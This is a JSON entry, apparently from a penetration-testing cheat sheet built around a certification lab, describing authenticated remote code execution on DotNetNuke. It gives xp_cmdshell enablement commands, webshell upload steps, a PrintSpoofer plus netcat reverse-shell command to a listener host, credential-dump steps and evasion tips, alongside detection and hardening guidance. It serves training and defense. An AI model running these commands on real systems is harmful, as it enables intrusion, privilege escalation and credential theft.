      "id": "dnn-admin-rce",
      "name": "DotNetNuke (DNN) - Authenticated RCE (SQL Console + File-Extension Bypass)",
      "command": "-- DNN SuperUser > Settings > SQL console: enable and run OS commands\nEXEC sp_configure 'show advanced options', '1'; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', '1'; RECONFIGURE;\nxp_cmdshell 'whoami'",
      "description": "DotNetNuke (DNN) is the '.NET WordPress' CMS. With SuperUser/admin credentials (often pillaged from a web.config on an open share), two built-in features give code execution: the SQL console under Settings can enable xp_cmdshell for direct OS commands, and the Allowable File Extensions list can be widened to permit .asp/.aspx so an ASPX webshell can be uploaded via the File Management page. The web/SQL service typically holds SeImpersonate, so PrintSpoofer/JuicyPotato escalates straight to SYSTEM.",
      "type": "command",
      "platform": "windows",
      "requires": [
        "valid-credentials"
      ],
      "protocols": [
        "http",
        "mssql"
      ],
      "tools": [
        "browser",
        "printspoofer",
        "netcat"
      ],
      "tags": [
        "dotnetnuke",
        "dnn",
        "cms",
        "xp-cmdshell",
        "webshell",
        "file-upload",
        "rce",
        "aspx"
      ],
      "category": "Exploitation",
      "subcategory": "DotNetNuke",
      "certifications": [
        "CPTS"
      ],
      "primary_cert": "CPTS",
      "source": "CPTS Module 28: Attacking Enterprise Networks",
      "variations": [
        {
          "label": "RCE path 2 - widen Allowable File Extensions, upload ASPX webshell",
          "command": "# Settings > Security > More > More Security Settings -> add asp,aspx to Allowable File Extensions -> Save\n# then http://<ip>/admin/file-management -> upload webshell.asp -> right-click > Get URL -> browse to run commands"
        },
        {
          "label": "Escalate to SYSTEM via SeImpersonate (files land in Portals\\0)",
          "command": "c:\\DotNetNuke\\Portals\\0\\PrintSpoofer64.exe -c \"c:\\DotNetNuke\\Portals\\0\\nc.exe <lhost> 443 -e cmd\""
        }
      ],
      "examples": [
        {
          "label": "Fingerprint DNN + find the admin login",
          "command": "curl http://<ip>/\n# browse http://<ip>/Login?returnurl=%2fadmin"
        },
        {
          "label": "Credentials commonly pillaged from a DNN web.config on an open NFS/SMB share",
          "command": "# <username>Administrator</username> <password><value>D0tn31Nuk3R0ck$$@123</value></password>"
        },
        {
          "label": "Confirm command execution through the SQL console",
          "command": "xp_cmdshell 'whoami'   # -> nt service\\mssql$sqlexpress (or IIS APPPOOL\\DotNetNukeAppPool)"
        }
      ],
      "notes": "Two independent RCE routes once logged in as a DNN SuperUser: (1) the SQL console (Settings page) enables xp_cmdshell and runs OS commands directly - the MSSQL service context usually has SeImpersonate; (2) if the SQL console is locked down, extend Allowable File Extensions to include asp/aspx and upload an ASPX webshell through /admin/file-management, then 'Get URL' to execute. Uploaded files land in C:\\DotNetNuke\\Portals\\0 - re-widen extensions to also allow .exe so you can drop PrintSpoofer64.exe + nc.exe and pivot SeImpersonate -> NT AUTHORITY\\SYSTEM. From SYSTEM: reg save SAM/SYSTEM/SECURITY -> secretsdump for local + cached domain creds. This is the DEV01 foothold in the M28 capstone; it reuses mssql-enable-xpcmdshell and seimpersonate-printspoofer but the DNN-specific admin/upload vectors are unique.",
      "references": [
        {
          "title": "DNN - Allowable file types and extensions for upload",
          "url": "https://dnnsupport.dnnsoftware.com/article/57495-allowable-file-types-and-extensions-for-upload"
        },
        {
          "title": "HTB Academy - Attacking Enterprise Networks",
          "url": "https://academy.hackthebox.com/module/details/163"
        }
      ],
      "recommended": [
        {
          "id": "nfs-enum",
          "note": "Enumerate/mount the open NFS share that leaks the DNN web.config credentials.",
          "rel": "prereq"
        },
        {
          "id": "mssql-enable-xpcmdshell",
          "note": "The xp_cmdshell enablement this card drives from the DNN SQL console.",
          "rel": "alternative"
        },
        {
          "id": "seimpersonate-printspoofer",
          "note": "Escalate the webshell/SQL context (SeImpersonate) to SYSTEM.",
          "rel": "escalation"
        }
      ],
      "opsec": "loud",
      "mitre": [
        "T1190",
        "T1505.003",
        "T1059"
      ],
      "exam": "exam-ok",
      "defense": {
        "prerequisites": "Valid DNN SuperUser/administrator credentials (frequently recovered from a web.config left on an anonymously accessible NFS/SMB share). HTTP access to the DNN admin UI.",
        "why_it_works": "DNN ships two admin features that are code-execution primitives by design: a SQL console that can toggle and call xp_cmdshell, and a configurable upload allow-list that can be widened to server-executable extensions (.asp/.aspx). Neither is a CVE - it is built-in functionality abused with admin rights.",
        "misconfiguration": "web.config with cleartext admin password exposed on an open share; SuperUser access to the SQL console; upload allow-list editable to include executable extensions; MSSQL/app pool running with SeImpersonate.",
        "impact": "Remote code execution on the DNN/IIS host as the service account, then SeImpersonate -> SYSTEM, local SAM + cached domain credentials, and a foothold into the AD domain.",
        "detection": "MSSQL: sp_configure changes enabling xp_cmdshell; xp_cmdshell process spawns (sqlservr.exe -> cmd.exe). Web: uploads of .asp/.aspx to Portals\\0 or /admin/file-management; changes to Allowable File Extensions; new admin logins from unusual IPs.",
        "artifacts": "SQL Server error/audit log (xp_cmdshell enabled); IIS logs showing webshell requests; new .asp/.aspx/.exe files under C:\\DotNetNuke\\Portals\\0; DNN event log admin-login and settings-change entries.",
        "vulnerable_config": "# DNN admin can run Settings > SQL console\n# Allowable File Extensions editable to asp,aspx,exe\n# web.config readable on an 'everyone' NFS export",
        "secure_config": "# Remove/secure web.config from all shares; no anonymous NFS/SMB exports\n# Restrict DNN SuperUser; disable the SQL console for non-DBA roles\n# Keep upload allow-list to non-executable types; run MSSQL app pool without SeImpersonate\n# Enforce least privilege on the service account",
        "prevention": "Never store cleartext creds in web.config on shares; lock down anonymous file shares. Restrict SuperUser accounts and disable/limit the SQL console. Keep the upload allow-list free of executable extensions. Remove SeImpersonate from service accounts where possible. [MITRE M1035, M1022, M1026, M1018]",
        "evasion": "Rename the webshell to an innocuous name; delete PrintSpoofer/nc after obtaining SYSTEM; run xp_cmdshell sparingly to avoid noisy sqlservr->cmd spawns.",
        "sources": [
          "HTB M28",
          "MITRE T1190",
          "MITRE T1505.003",
          "MITRE T1059"
        ],
        "code_review": "RED FLAGS (source): file saved using client-supplied name/extension; MIME trusted from the request.\n  move_uploaded_file(..., $_FILES['f']['name'])  |  extension blacklist  |  type check on $_FILES['f']['type'] (client-controlled)\nGREP:  grep -rniE \"move_uploaded_file|\\$_FILES|multer|formidable|MultipartFile|SaveAs\\(\" .\nSAFE:  extension ALLOWLIST + magic-byte MIME (finfo/mime_content_type), server-generated random filename, store outside webroot in a no-execute dir."
      }
